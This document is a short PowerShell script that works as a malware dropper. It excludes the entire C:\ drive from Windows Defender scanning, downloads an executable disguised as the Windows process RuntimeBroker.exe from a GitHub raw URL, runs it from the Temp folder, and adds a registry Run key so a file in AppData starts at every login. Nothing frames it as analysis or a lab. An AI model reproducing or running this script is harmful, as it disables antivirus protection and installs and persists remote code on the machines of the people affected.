Add-MpPreference -ExclusionPath C:\
$url = "https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/RuntimeBroker.exe"
$output = "$env:Temp/RuntimeBroker.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output
$exePath = "$env:APPDATA\SubDir\Runtime broker.exe"
$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regValueName = "RuntimeBroker"
Set-ItemProperty -Path $regKeyPath -Name $regValueName -Value $exePath
